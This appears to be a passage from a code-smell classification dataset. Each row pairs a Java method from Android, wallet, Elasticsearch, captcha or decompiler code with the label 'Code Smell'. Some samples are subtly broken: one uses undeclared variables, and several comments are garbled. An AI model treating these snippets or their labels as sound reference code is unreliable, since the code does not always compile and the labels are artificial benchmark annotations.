    if (left <= x && left + textLayout.getLineWidth(line) >= x && y >= 0 && y <= textLayout.getHeight()) {
      Spannable buffer=(Spannable)textLayout.getText();
      ClickableSpan[] link=buffer.getSpans(off,off,ClickableSpan.class);
      if (link.length != 0 && !AndroidUtilities.isAccessibilityScreenReaderEnabled()) {
        LinkSpanDrawable linkDrawable=new LinkSpanDrawable(link[0],resourcesProvider,ex,ey);
        linkDrawable.setColor(processColor(Theme.getColor(Theme.key_chat_linkSelectBackground,resourcesProvider)));
        int start=buffer.getSpanStart(link[0]);
        int end=buffer.getSpanEnd(link[0]);
        LinkPath path=linkDrawable.obtainNewPath();
        path.setCurrentLayout(textLayout,start,pressedLinkYOffset=textY);
        textLayout.getSelectionPath(start,end,path);
        return linkDrawable;
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"private List<PayNym> getExistingWalletPayNyms(Map<PaymentCode,PayNym> payNymMap){
  List<Wallet> childWallets=new ArrayList<>(getMasterWallet().getChildWallets());
  childWallets.sort(Comparator.comparingInt(o -> -o.getScriptType().ordinal()));
  for (  Wallet childWallet : childWallets) {
    if (childWallet.isBip47()) {
      PaymentCode externalPaymentCode=childWallet.getKeystores().get(0).getExternalPaymentCode();
      String walletNymName=PayNym.getNymName(childWallet);
      if (payNymMap.get(externalPaymentCode) == null || (walletNymName != null && !walletNymName.equals(payNymMap.get(externalPaymentCode).nymName()))) {
        payNymMap.put(externalPaymentCode,PayNym.fromWallet(childWallet));
      }
    }
  }
  return new ArrayList<>(payNymMap.values());
}",1,Code Smell
"/** 
 * 创建客户端实例
 * @return
 */
private static RestHighLevelClient getInstance(String inputurl,String inputusername,String inputpassword){
  if (url.equals(inputurl) && username.equals(inputusername) && password.equals(inputpassword)&& httpClient != null) {
    return httpClient;
  }
  try {
    url=inputurl;
    username=inputusername;
    password=inputpassword;
    URL elasticUrl=new URL(url);
    RestClientBuilder builder=RestClient.builder(new HttpHost(elasticUrl.getHost(),elasticUrl.getPort(),elasticUrl.getProtocol()));
    String authValue=Base64.getEncoder().encodeToString((username + "":"" + password).getBytes(StandardCharsets.UTF_8));
    builder.setDefaultHeaders(new Header[]{new BasicHeader(""Authorization"",String.format(""Basic %s"",authValue))});
    httpClient=new RestHighLevelClient(builder);
    createIndices(indexName);
    createListener();
    return httpClient;
  }
 catch (  Exception e) {
    e.printStackTrace();
    return null;
  }
}",1,Code Smell
"protected String convertOperand(Operand operand){
  var context=new StringBuilder();
  this.convertOperand(operand,context);
  return context.toString();
}
protected void convertOperand(Operand operand,StringBuilder context){
  if (operand instanceof Filter.Group) {
    this.doGroup(group,context);
  }
 else   if (operand instanceof Filter.Key) {
    this.doKey(key,context);
  }
 else   if (operand instanceof Filter.Value) {
    this.doValue(value,context);
  }
 else   if (operand instanceof Filter.Expression) {
    if ((expression.type() != ExpressionType.NOT && expression.type() != ExpressionType.AND && expression.type() != ExpressionType.OR) && !(expression.right() instanceof Filter.Value)) {
      throw new RuntimeException(""Non AND/OR expression must have Value right argument!"");
    }
    if (expression.type() == ExpressionType.NOT) {
      this.doNot(expression,context);
    }
 else {
      this.doExpression(expression,context);
    }
  }
}
",1,Code Smell
"@Override public ResponseModel check(CaptchaVO captchaVO){
  ResponseModel r=super.check(captchaVO);
  if (!validatedReq(r)) {
    return r;
  }
  String codeKey=String.format(REDIS_CAPTCHA_KEY,captchaVO.getToken());
  if (!CaptchaServiceFactory.getCache(cacheType).exists(codeKey)) {
    return ResponseModel.errorMsg(RepCodeEnum.API_CAPTCHA_INVALID);
  }
  String s=CaptchaServiceFactory.getCache(cacheType).get(codeKey);
  CaptchaServiceFactory.getCache(cacheType).delete(codeKey);
  PointVO point=null;
  PointVO point1=null;
  String pointJson=null;
  try {
    point=JsonUtil.parseObject(s,PointVO.class);
    pointJson=decrypt(captchaVO.getPointJson(),point.getSecretKey());
    point1=JsonUtil.parseObject(pointJson,PointVO.class);
  }
 catch (  Exception e) {
    logger.error(""楠岃瘉鐮佸潗鏍囪В鏋愬け璐�"",e);
    afterValidateFail(captchaVO);
    return ResponseModel.errorMsg(e.getMessage());
  }
  if (point.x - Integer.parseInt(slipOffset) > point1.x || point1.x > point.x + Integer.parseInt(slipOffset) || point.y != point1.y) {
    afterValidateFail(captchaVO);
    return ResponseModel.errorMsg(RepCodeEnum.API_CAPTCHA_COORDINATE_ERROR);
  }
  String secretKey=point.getSecretKey();
  String value=null;
  try {
    value=AESUtil.aesEncrypt(captchaVO.getToken().concat(""---"").concat(pointJson),secretKey);
  }
 catch (  Exception e) {
    logger.error(""AES鍔犲瘑澶辫触"",e);
    afterValidateFail(captchaVO);
    return ResponseModel.errorMsg(e.getMessage());
  }
  String secondKey=String.format(REDIS_SECOND_CAPTCHA_KEY,value);
  CaptchaServiceFactory.getCache(cacheType).set(secondKey,captchaVO.getToken(),EXPIRESIN_THREE);
  captchaVO.setResult(true);
  captchaVO.resetClientFlag();
  return ResponseModel.successData(captchaVO);
}",1,Code Smell
"private RowMapper<LogPoint> createLogPointRowMapper(ObjectMapper mapper){
  return new BeanPropertyRowMapper<LogPoint>(LogPoint.class){
    @SneakyThrows @Override protected Object getColumnValue(    ResultSet rs,    int index,    PropertyDescriptor pd){
      if (pd.getName().equals(""webhookIds"")) {
        String webhookIds=rs.getString(""webhook_ids"");
        if (StringUtils.isEmpty(webhookIds)) {
          return null;
        }
        return mapper.readValue(webhookIds,new TypeReference<List<String>>(){
        }
);
      }
 else       if (pd.getName().equals(""tags"")) {
        String tags=rs.getString(""tags"");
        if (StringUtils.isEmpty(tags)) {
          return null;
        }
        return mapper.readValue(tags,new TypeReference<List<String>>(){
        }
);
      }
 else {
        return super.getColumnValue(rs,index,pd);
      }
    }
  }
;
}
",1,Code Smell
"private void checkInteract(GeyserSession session,ClientboundBlockUpdatePacket packet){
  Vector3i lastInteractPos=session.getLastInteractionBlockPosition();
  if (lastInteractPos == null || !session.isInteracting()) {
    return;
  }
  if ((lastInteractPos.getX() != packet.getEntry().getPosition().getX() || lastInteractPos.getY() != packet.getEntry().getPosition().getY() || lastInteractPos.getZ() != packet.getEntry().getPosition().getZ())) {
    return;
  }
  BlockState state=BlockState.of(packet.getEntry().getBlock());
  session.setInteracting(false);
  BlockSoundInteractionTranslator.handleBlockInteraction(session,lastInteractPos.toFloat(),state);
}",1,Code Smell
"@OnlyIn(Dist.CLIENT) public void tickAudio(){
  float componentSpeed=Math.abs(getSpeed());
  if (componentSpeed == 0)   return;
  float pitch=Mth.clamp((componentSpeed / 256f) + .45f,.85f,1f);
  if (isNoisy())   SoundScapes.play(AmbienceGroup.KINETIC,worldPosition,pitch);
  Block block=getBlockState().getBlock();
  if (ICogWheel.isSmallCog(block) || ICogWheel.isLargeCog(block) || block instanceof GearboxBlock)   SoundScapes.play(AmbienceGroup.COG,worldPosition,pitch);
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.contactsDidLoad) {
    if (emptyView != null) {
      emptyView.showProgress(false);
    }
    if (adapter != null) {
      adapter.notifyDataSetChanged();
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    if (listView != null) {
      int mask=(Integer)args[0];
      int count=listView.getChildCount();
      if ((mask & MessagesController.UPDATE_MASK_AVATAR) != 0 || (mask & MessagesController.UPDATE_MASK_NAME) != 0 || (mask & MessagesController.UPDATE_MASK_STATUS) != 0) {
        for (int a=0; a < count; a++) {
          View child=listView.getChildAt(a);
          if (child instanceof GroupCreateUserCell) {
            ((GroupCreateUserCell)child).update(mask);
          }
        }
      }
    }
  }
 else   if (id == NotificationCenter.chatDidCreated) {
    removeSelfFromStack();
  }
}",1,Code Smell
"private void setOutput(@Nullable Object output) throws ExoPlaybackException {
  @Nullable Surface surface=output instanceof Surface ? (Surface)output : null;
  if (surface == null) {
    if (placeholderSurface != null) {
      surface=placeholderSurface;
    }
 else {
      MediaCodecInfo codecInfo=getCodecInfo();
      if (codecInfo != null && shouldUsePlaceholderSurface(codecInfo)) {
        placeholderSurface=PlaceholderSurface.newInstanceV17(context,codecInfo.secure);
        surface=placeholderSurface;
      }
    }
  }
  if (this.surface != surface) {
    this.surface=surface;
    frameReleaseHelper.onSurfaceChanged(surface);
    haveReportedFirstFrameRenderedForCurrentSurface=false;
    @State int state=getState();
    @Nullable MediaCodecAdapter codec=getCodec();
    if (codec != null) {
      if (Util.SDK_INT >= 23 && surface != null && !codecNeedsSetOutputSurfaceWorkaround) {
        try {
          setOutputSurfaceV23(codec,surface);
        }
 catch (        Throwable e) {
          e.printStackTrace();
          throw new SurfaceNotValidException(e);
        }
      }
 else {
        releaseCodec();
        maybeInitCodecOrBypass();
      }
    }
    if (surface != null && surface != placeholderSurface) {
      maybeRenotifyVideoSizeChanged();
      clearRenderedFirstFrame();
      if (state == STATE_STARTED) {
        setJoiningDeadlineMs();
      }
    }
 else {
      clearReportedVideoSize();
      clearRenderedFirstFrame();
    }
  }
 else   if (surface != null && surface != placeholderSurface) {
    maybeRenotifyVideoSizeChanged();
    maybeRenotifyRenderedFirstFrame();
  }
}",1,Code Smell
"@Override public VarType getExprType(){
  VarType exprType=null;
  if (funcType <= FUNCTION_NEG || funcType == FUNCTION_IPP || funcType == FUNCTION_PPI || funcType == FUNCTION_IMM || funcType == FUNCTION_MMI) {
    VarType type1=lstOperands.get(0).getExprType();
    VarType type2=null;
    if (lstOperands.size() > 1) {
      type2=lstOperands.get(1).getExprType();
    }
switch (funcType) {
case FUNCTION_IMM:
case FUNCTION_MMI:
case FUNCTION_IPP:
case FUNCTION_PPI:
      exprType=implicitType;
    break;
case FUNCTION_BOOL_NOT:
  exprType=VarType.VARTYPE_BOOLEAN;
break;
case FUNCTION_SHL:
case FUNCTION_SHR:
case FUNCTION_USHR:
case FUNCTION_BIT_NOT:
case FUNCTION_NEG:
exprType=getMaxVarType(new VarType[]{type1});
break;
case FUNCTION_ADD:
case FUNCTION_SUB:
case FUNCTION_MUL:
case FUNCTION_DIV:
case FUNCTION_REM:
exprType=getMaxVarType(new VarType[]{type1,type2});
break;
case FUNCTION_AND:
case FUNCTION_OR:
case FUNCTION_XOR:
if (type1.type == CodeConstants.TYPE_BOOLEAN & type2.type == CodeConstants.TYPE_BOOLEAN) {
exprType=VarType.VARTYPE_BOOLEAN;
}
 else {
exprType=getMaxVarType(new VarType[]{type1,type2});
}
}
}
 else if (funcType == FUNCTION_CAST) {
exprType=lstOperands.get(1).getExprType();
}
 else if (funcType == FUNCTION_IIF) {
Exprent param1=lstOperands.get(1);
Exprent param2=lstOperands.get(2);
VarType supertype=VarType.getCommonSupertype(param1.getExprType(),param2.getExprType());
if (param1.type == Exprent.EXPRENT_CONST && param2.type == Exprent.EXPRENT_CONST && supertype.type != CodeConstants.TYPE_BOOLEAN && VarType.VARTYPE_INT.isSuperset(supertype)) {
exprType=VarType.VARTYPE_INT;
}
 else {
exprType=supertype;
}
}
 else if (funcType == FUNCTION_STR_CONCAT) {
exprType=VarType.VARTYPE_STRING;
}
 else if (funcType >= FUNCTION_EQ || funcType == FUNCTION_INSTANCEOF) {
exprType=VarType.VARTYPE_BOOLEAN;
}
 else if (funcType >= FUNCTION_ARRAY_LENGTH) {
exprType=VarType.VARTYPE_INT;
}
 else {
exprType=TYPES[funcType - FUNCTION_I2L];
}
return exprType;
}",1,Code Smell
"@Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpParam) throws Throwable {
  try {
    DeviceConfigClass=findClass(""android.provider.DeviceConfig"",lpParam.classLoader);
    hookAllMethods(DeviceConfigClass,""setProperty"",new XC_MethodHook(){
      @Override protected void beforeHookedMethod(      MethodHookParam param) throws Throwable {
        if (""systemui_PixelXpert"".equals(param.args[0])) {
          param.args[0]=""systemui"";
          return;
        }
        if (SeparateRingNotifVol && VOLUME_SEPARATE_NOTIFICATION.equals(param.args[1])) {
          param.setResult(true);
        }
      }
    }
);
    if (Constants.SYSTEM_FRAMEWORK_PACKAGE.equals(lpParam.packageName))     setSeparateRingerNotif(SeparateRingNotifVol);
  }
 catch (  Throwable ignored) {
  }
}",1,Code Smell
"public static boolean isValide(MulticastMessageData sendMessageData){
  if (sendMessageData == null || StringUtil.isNullOrEmpty(sendMessageData.getSender()) || sendMessageData.getPayload() == null) {
    return false;
  }
  return true;
}
",1,Code Smell
"private void updateRows(boolean notify){
  rowCount=0;
  useProxyRow=rowCount++;
  if (useProxySettings && SharedConfig.currentProxy != null && SharedConfig.proxyList.size() > 1 && IS_PROXY_ROTATION_AVAILABLE) {
    rotationRow=rowCount++;
    if (SharedConfig.proxyRotationEnabled) {
      rotationTimeoutRow=rowCount++;
      rotationTimeoutInfoRow=rowCount++;
    }
 else {
      rotationTimeoutRow=-1;
      rotationTimeoutInfoRow=-1;
    }
  }
 else {
    rotationRow=-1;
    rotationTimeoutRow=-1;
    rotationTimeoutInfoRow=-1;
  }
  if (rotationTimeoutInfoRow == -1) {
    useProxyShadowRow=rowCount++;
  }
 else {
    useProxyShadowRow=-1;
  }
  connectionsHeaderRow=rowCount++;
  if (notify) {
    proxyList.clear();
    proxyList.addAll(SharedConfig.proxyList);
    boolean checking=false;
    if (!wasCheckedAllList) {
      for (      SharedConfig.ProxyInfo info : proxyList) {
        if (info.checking || info.availableCheckTime == 0) {
          checking=true;
          break;
        }
      }
      if (!checking) {
        wasCheckedAllList=true;
      }
    }
    boolean isChecking=checking;
    Collections.sort(proxyList,(o1,o2) -> {
      long bias1=SharedConfig.currentProxy == o1 ? -200000 : 0;
      if (!o1.available) {
        bias1+=100000;
      }
      long bias2=SharedConfig.currentProxy == o2 ? -200000 : 0;
      if (!o2.available) {
        bias2+=100000;
      }
      return Long.compare(isChecking && o1 != SharedConfig.currentProxy ? SharedConfig.proxyList.indexOf(o1) * 10000L : o1.ping + bias1,isChecking && o2 != SharedConfig.currentProxy ? SharedConfig.proxyList.indexOf(o2) * 10000L : o2.ping + bias2);
    }
);
  }
  if (!proxyList.isEmpty()) {
    proxyStartRow=rowCount;
    rowCount+=proxyList.size();
    proxyEndRow=rowCount;
  }
 else {
    proxyStartRow=-1;
    proxyEndRow=-1;
  }
  proxyAddRow=rowCount++;
  proxyShadowRow=rowCount++;
  if (SharedConfig.currentProxy == null || SharedConfig.currentProxy.secret.isEmpty()) {
    boolean change=callsRow == -1;
    callsRow=rowCount++;
    callsDetailRow=rowCount++;
    if (!notify && change) {
      listAdapter.notifyItemChanged(proxyShadowRow);
      listAdapter.notifyItemRangeInserted(proxyShadowRow + 1,2);
    }
  }
 else {
    boolean change=callsRow != -1;
    callsRow=-1;
    callsDetailRow=-1;
    if (!notify && change) {
      listAdapter.notifyItemChanged(proxyShadowRow);
      listAdapter.notifyItemRangeRemoved(proxyShadowRow + 1,2);
    }
  }
  if (proxyList.size() >= 10) {
    deleteAllRow=rowCount++;
  }
 else {
    deleteAllRow=-1;
  }
  checkProxyList();
  if (notify && listAdapter != null) {
    listAdapter.notifyDataSetChanged();
  }
}",1,Code Smell
"/** 
 * recovery  methods        
 */
public byte[] recoverPubkey(byte[] msg,byte[] dersig,byte[] coordx,Boolean compressed) throws CardException {
  ECDSASignature ecdsaSig=ECDSASignature.decodeFromDER(dersig);
  byte recId=-1;
  ECKey k=null;
  for (byte i=0; i < 4; i++) {
    k=ECKey.recoverFromSignature(i,ecdsaSig,Sha256Hash.of(msg),compressed);
    if (k != null && Arrays.equals(k.getPubKeyXCoord(),coordx)) {
      recId=i;
      break;
    }
  }
  if (recId == -1) {
    throw new CardException(""Could not construct a recoverable key. This should never happen."");
  }
  return k.getPubKey();
}",1,Code Smell
"/** 
 * Construct an instance. It initially contains no elements.
 * @param declaringType the type declaring the program element.
 * @param type the annotation type.
 * @param annotatedElement the program element type to be annotated.
 * @return an annotation {@code AnnotationId<D,V>} instance.
 */
public static <D,V>AnnotationId<D,V> get(TypeId<D> declaringType,TypeId<V> type,ElementType annotatedElement){
  if (annotatedElement != ElementType.TYPE && annotatedElement != ElementType.METHOD && annotatedElement != ElementType.FIELD && annotatedElement != ElementType.PARAMETER) {
    throw new IllegalArgumentException(""element type is not supported to annotate yet."");
  }
  return new AnnotationId<>(declaringType,type,annotatedElement);
}
",1,Code Smell
"private static boolean matcherSearchText(String text,List<String> keywordList){
  if (text == null || TextUtils.isEmpty(text) || keywordList == null || keywordList.size() == 0) {
    return false;
  }
  String keyword=keywordList.get(0);
  SpannableString spannableString=new SpannableString(text);
  Pattern pattern=Pattern.compile(Pattern.quote(keyword),Pattern.CASE_INSENSITIVE);
  Matcher matcher=pattern.matcher(spannableString);
  while (matcher.find()) {
    return true;
  }
  return false;
}",1,Code Smell
"@Override public void handleRequest(ChannelHandlerContext ctx,FullHttpRequest req,QueryStringDecoder decoder,String[] segments) throws ModelException, DownloadArchiveException, WorkflowException, WorkerInitializationException {
  if (isApiDescription(segments)) {
    String path=decoder.path();
    if ((""/"".equals(path) && HttpMethod.OPTIONS.equals(req.method())) || (segments.length == 2 && segments[1].equals(""api-description""))) {
      handleApiDescription(ctx);
      return;
    }
    throw new MethodNotAllowedException();
  }
 else {
    chain.handleRequest(ctx,req,decoder,segments);
  }
}",1,Code Smell
"public static Long dataFilter(Integer menuId,Long userId){
  List<Long> userIdList=new ArrayList<>();
  userIdList.add(userId);
  dataFilter(menuId,userIdList);
  if (CollectionUtil.isEmpty(userIdList)) {
    return 0L;
  }
  return userId;
}
/** 
 * 鏁版嵁鏉冮檺杩囨护
 * @param menuId     鑿滃崟ID
 * @param userIdList 鐢ㄦ埛ID
 * @return data
 */
public static void dataFilter(Integer menuId,List<Long> userIdList){
  if (!UserUtil.isAdmin()) {
    AdminService adminService=ApplicationContextHolder.getBean(AdminService.class);
    List<Long> authUserIdList=new ArrayList<>();
    Integer dataType=adminService.queryDataType(UserUtil.getUserId(),menuId).getData();
    if (dataType == null) {
      userIdList.clear();
    }
 else     if (dataType != 5) {
      if (dataType == 1) {
        authUserIdList.add(UserUtil.getUserId());
      }
 else       if (dataType == 2) {
        authUserIdList=adminService.queryChildUserId(UserUtil.getUserId()).getData();
        authUserIdList.add(UserUtil.getUserId());
      }
 else       if (dataType == 3) {
        authUserIdList=adminService.queryUserByDeptIds(Collections.singletonList(UserUtil.getUser().getDeptId())).getData();
      }
 else       if (dataType == 4) {
        List<Integer> deptIdList=adminService.queryChildDeptId(UserUtil.getUser().getDeptId()).getData();
        deptIdList.add(UserUtil.getUser().getDeptId());
        authUserIdList=adminService.queryUserByDeptIds(deptIdList).getData();
      }
      userIdList.retainAll(authUserIdList);
    }
  }
}
public String dataFilter(Integer menuId,String userIds){
  List<Long> userIdList=Arrays.stream(userIds.split("","")).map(Long::parseLong).collect(Collectors.toList());
  dataFilter(menuId,userIdList);
  return CollectionUtil.join(userIdList,"","");
}",1,Code Smell
"@Override public Window getWindow(int windowIndex,Window window,boolean setTag,long defaultPositionProjectionUs){
  Assertions.checkIndex(windowIndex,0,1);
  Object tag=setTag ? this.tag : null;
  long windowDefaultStartPositionUs=this.windowDefaultStartPositionUs;
  if (isDynamic && defaultPositionProjectionUs != 0) {
    if (windowDurationUs == C.TIME_UNSET) {
      windowDefaultStartPositionUs=C.TIME_UNSET;
    }
 else {
      windowDefaultStartPositionUs+=defaultPositionProjectionUs;
      if (windowDefaultStartPositionUs > windowDurationUs) {
        windowDefaultStartPositionUs=C.TIME_UNSET;
      }
    }
  }
  return window.set(tag,presentationStartTimeMs,windowStartTimeMs,isSeekable,isDynamic,windowDefaultStartPositionUs,windowDurationUs,0,0,windowPositionInPeriodUs);
}",1,Code Smell
"private List<JSONObject> parseAggs(Aggregations aggs,List<InterfaceGroupField> groupFieldList,List<InterfaceQueryField> queryFieldList,List<String> responseFields,JSONObject lastResult){
  if (CollectionUtils.isEmpty(groupFieldList)) {
    List<JSONObject> aggsResult=new ArrayList<>();
    JSONObject result=parseAggregationsValue(aggs,queryFieldList);
    result.putAll(lastResult);
    JSONObject respResult=new JSONObject();
    responseFields.forEach(responseField -> respResult.put(responseField,result.get(responseField)));
    aggsResult.add(respResult);
    return aggsResult;
  }
 else {
    ArrayList<InterfaceGroupField> restGroupFieldList=new ArrayList<>(groupFieldList);
    InterfaceGroupField groupField=restGroupFieldList.remove(0);
    Aggregation agg=aggs.get(groupField.getField());
    List<JSONObject> aggsResult=new ArrayList<>();
    if (groupField.getOperator().equals(ValidConstant.ES_DATE_HISTOGRAM_BUCKET)) {
      ParsedDateHistogram dateHistogramAgg=(ParsedDateHistogram)agg;
      List<ParsedDateHistogram.ParsedBucket> dateHistogramBuckets=(List<ParsedDateHistogram.ParsedBucket>)dateHistogramAgg.getBuckets();
      for (      ParsedDateHistogram.ParsedBucket dateHistogramBucket : dateHistogramBuckets) {
        ZonedDateTime datetime=(ZonedDateTime)dateHistogramBucket.getKey();
        Long timestamp=Timestamp.valueOf(datetime.toLocalDateTime()).getTime();
        JSONObject result=new JSONObject();
        result.put(groupField.getField(),timestamp);
        result.putAll(lastResult);
        Aggregations nextAggs=dateHistogramBucket.getAggregations();
        List<JSONObject> nextResult=parseAggs(nextAggs,restGroupFieldList,queryFieldList,responseFields,result);
        aggsResult.addAll(nextResult);
      }
    }
 else {
      ParsedTerms termsAgg=(ParsedTerms)agg;
      List<ParsedTerms.ParsedBucket> termsBuckets=(List<ParsedTerms.ParsedBucket>)termsAgg.getBuckets();
      for (      ParsedTerms.ParsedBucket termsBucket : termsBuckets) {
        JSONObject result=new JSONObject();
        ColumnType columnType=ColumnType.valueOf(groupField.getType().toUpperCase());
        result.put(groupField.getField(),getValue(termsBucket.getKey(),columnType));
        result.putAll(lastResult);
        Aggregations nextAggs=termsBucket.getAggregations();
        List<JSONObject> nextResult=parseAggs(nextAggs,restGroupFieldList,queryFieldList,responseFields,result);
        aggsResult.addAll(nextResult);
      }
    }
    return aggsResult;
  }
}",1,Code Smell
"@Override public void onDestroy(){
  super.onDestroy();
  if (conversation == null) {
    return;
  }
  if ((conversation.type == Conversation.ConversationType.Single && !ChatManager.Instance().isMyFriend(conversation.target)) || conversation.type == Conversation.ConversationType.Group) {
    userOnlineStateViewModel.unwatchOnlineState(conversation.type.getValue(),new String[]{conversation.target});
  }
  if (conversation.type == Conversation.ConversationType.ChatRoom) {
    if (!isPreJoinedChatRoom) {
      quitChatRoom();
    }
  }
 else   if (conversation.type == Conversation.ConversationType.Channel) {
    LeaveChannelChatMessageContent content=new LeaveChannelChatMessageContent();
    messageViewModel.sendMessage(conversation,content);
  }
  messageViewModel.messageLiveData().removeObserver(messageLiveDataObserver);
  messageViewModel.messageUpdateLiveData().removeObserver(messageUpdateLiveDatObserver);
  messageViewModel.messageRemovedLiveData().removeObserver(messageRemovedLiveDataObserver);
  messageViewModel.messageBurnedLiveData().removeObserver(messageBurnedLiveDataObserver);
  messageViewModel.messageStartBurnLiveData().removeObserver(messageStartBurnLiveDataObserver);
  userViewModel.userInfoLiveData().removeObserver(userInfoUpdateLiveDataObserver);
  conversationViewModel.clearConversationMessageLiveData().removeObserver(clearConversationMessageObserver);
  conversationViewModel.secretConversationStateLiveData().removeObserver(secretChatStateObserver);
  settingViewModel.settingUpdatedLiveData().removeObserver(settingUpdateLiveDataObserver);
  unInitGroupObservers();
  inputPanel.onDestroy();
  if (conversation.type == Conversation.ConversationType.SecretChat) {
    List<UiMessage> messages=adapter.getMessages();
    if (messages != null) {
      for (      UiMessage uiMsg : messages) {
        File file=DownloadManager.mediaMessageContentFile(uiMsg.message);
        if (file != null && file.exists()) {
          file.delete();
        }
      }
    }
  }
}
",1,Code Smell
"private List<DataSetStructureHighlight> parseDataSetStructureSearch(final String dataSetStructureHighlight,final DatasetStructureDto structureDto){
  if (!isHighlighted(dataSetStructureHighlight)) {
    return null;
  }
  final String[] dataSetStructures=dataSetStructureHighlight.split(GROUP_DELIMITER);
  final List<DataSetStructureHighlight> dataSetStructureHighlights=new ArrayList<>();
  for (  final String dataSetStructure : dataSetStructures) {
    final String[] fields=dataSetStructure.split(RECORD_DELIMITER,-1);
    final String highlightedName=fields[0];
    final String highlightedIntDescription=fields[1];
    final String highlightedExtDescription=fields[2];
    final String highlightedTags=fields[3];
    if (isHighlighted(highlightedName) || isHighlighted(highlightedIntDescription) || isHighlighted(highlightedExtDescription)|| isHighlighted(highlightedTags)) {
      final DataSetStructureHighlight dataSetStructureHighlightDto=new DataSetStructureHighlight();
      dataSetStructureHighlightDto.setName(highlightedName);
      if (isHighlighted(highlightedIntDescription)) {
        dataSetStructureHighlightDto.setInternalDescription(highlightedIntDescription);
      }
      if (isHighlighted(highlightedExtDescription)) {
        dataSetStructureHighlightDto.setExternalDescription(highlightedExtDescription);
      }
      if (isHighlighted(highlightedTags)) {
        final String datasetFieldName=highlightedName.replace(HIGHLIGHT_TAG,"""").replace(HIGHLIGHT_TAG_END,"""");
        final DatasetFieldDto dataSetFieldDto=structureDto.getDatasetFields().stream().filter(f -> f.getDatasetFieldPojo().getName().equals(datasetFieldName)).findFirst().orElseThrow(() -> new IllegalArgumentException(""Dataset field not found""));
        final List<Tag> tags=parseTags(highlightedTags,dataSetFieldDto);
        dataSetStructureHighlightDto.setTags(tags);
      }
      dataSetStructureHighlights.add(dataSetStructureHighlightDto);
    }
  }
  return dataSetStructureHighlights;
}",1,Code Smell
"/** 
 * <p>Finds an accessible method that matches the given name and has compatible parameters. Compatible parameters mean that every method parameter is assignable from  the given parameters. In other words, it finds a method with the given name  that will take the parameters given.<p> <p>This method is used by  {@link #invokeMethod(Object object,String methodName,Object[] args,Class[] parameterTypes)}. <p>This method can match primitive parameter by passing in wrapper classes. For example, a <code>Boolean</code> will match a primitive <code>boolean</code> parameter.
 * @param cls find method in this class
 * @param methodName find method with this name
 * @param parameterTypes find method with most compatible parameters 
 * @return The accessible method
 */
public static Method getMatchingAccessibleMethod(Class<?> cls,String methodName,Class<?>... parameterTypes){
  try {
    Method method=cls.getMethod(methodName,parameterTypes);
    MemberUtils.setAccessibleWorkaround(method);
    return method;
  }
 catch (  NoSuchMethodException e) {
  }
  Method bestMatch=null;
  Method[] methods=cls.getMethods();
  for (  Method method : methods) {
    if (method.getName().equals(methodName) && ClassUtils.isAssignable(parameterTypes,method.getParameterTypes(),true)) {
      Method accessibleMethod=getAccessibleMethod(method);
      if (accessibleMethod != null && (bestMatch == null || MemberUtils.compareParameterTypes(accessibleMethod.getParameterTypes(),bestMatch.getParameterTypes(),parameterTypes) < 0)) {
        bestMatch=accessibleMethod;
      }
    }
  }
  if (bestMatch != null) {
    MemberUtils.setAccessibleWorkaround(bestMatch);
  }
  return bestMatch;
}
/** 
 * <p>Finds an accessible method that matches the given name and has compatible parameters. Compatible parameters mean that every method parameter is assignable from  the given parameters. In other words, it finds a method with the given name  that will take the parameters given.<p> <p>This method is used by  {@link #invokeMethod(Object object,String methodName,Object[] args,Class[] parameterTypes)}. <p>This method can match primitive parameter by passing in wrapper classes. For example, a <code>Boolean</code> will match a primitive <code>boolean</code> parameter.
 * @param cls find method in this class
 * @param methodName find method with this name
 * @param parameterTypes find method with most compatible parameters 
 * @return The accessible method
 */
public static Method getMatchingAccessibleMethod(Class<?> cls,String methodName,Class<?>... parameterTypes){
  try {
    Method method=cls.getMethod(methodName,parameterTypes);
    MemberUtils.setAccessibleWorkaround(method);
    return method;
  }
 catch (  NoSuchMethodException e) {
  }
  Method bestMatch=null;
  Method[] methods=cls.getMethods();
  for (  Method method : methods) {
    if (method.getName().equals(methodName) && ClassUtils.isAssignable(parameterTypes,method.getParameterTypes(),true)) {
      Method accessibleMethod=getAccessibleMethod(method);
      if (accessibleMethod != null && (bestMatch == null || MemberUtils.compareParameterTypes(accessibleMethod.getParameterTypes(),bestMatch.getParameterTypes(),parameterTypes) < 0)) {
        bestMatch=accessibleMethod;
      }
    }
  }
  if (bestMatch != null) {
    MemberUtils.setAccessibleWorkaround(bestMatch);
  }
  return bestMatch;
}",1,Code Smell
"void showMoreActions(boolean show){
  if (show) {
    if (mMoreActionsViewHolder == null) {
      Action action=new PlaybackControlsRow.MoreActions(mMoreActionsDock.getContext());
      mMoreActionsViewHolder=mPresenter.onCreateViewHolder(mMoreActionsDock);
      mPresenter.onBindViewHolder(mMoreActionsViewHolder,action);
      mPresenter.setOnClickListener(mMoreActionsViewHolder,new View.OnClickListener(){
        @Override public void onClick(        View v){
          toggleMoreActions();
        }
      }
);
    }
    if (mMoreActionsViewHolder.view.getParent() == null) {
      mMoreActionsDock.addView(mMoreActionsViewHolder.view);
    }
  }
 else   if (mMoreActionsViewHolder != null && mMoreActionsViewHolder.view.getParent() != null) {
    mMoreActionsDock.removeView(mMoreActionsViewHolder.view);
  }
}
",1,Code Smell
"/** 
 * 娓呴櫎es鏁版嵁
 * @date 2020/11/13 13:35
 * @param client
 * @return long
 */
private long deleteByQuery(RestHighLevelClient client){
  List<String> indexList=new ArrayList<>();
  for (  CrmEnum value : CrmEnum.values()) {
    if (!value.equals(CrmEnum.NULL) && !value.equals(CrmEnum.CUSTOMER_POOL) && !value.equals(CrmEnum.MARKETING)) {
      indexList.add(value.getIndex());
    }
  }
  DeleteByQueryRequest request=new DeleteByQueryRequest(indexList.toArray(new String[0]));
  request.setConflicts(""proceed"");
  request.setSize(1000);
  request.setQuery(QueryBuilders.matchAllQuery());
  request.setRefresh(true);
  try {
    long size=1000, updateNum=0;
    while (size > 0) {
      BulkByScrollResponse response=client.deleteByQuery(request,RequestOptions.DEFAULT);
      size=response.getStatus().getUpdated();
      updateNum+=size;
    }
    log.info(""es鏁版嵁鏇存柊鎴愬姛銆傛湰娆℃洿鏂版竻闄や簡{}鏉℃棤鐢ㄦ暟鎹紒"",updateNum);
    return updateNum;
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
  return -1;
}",1,Code Smell
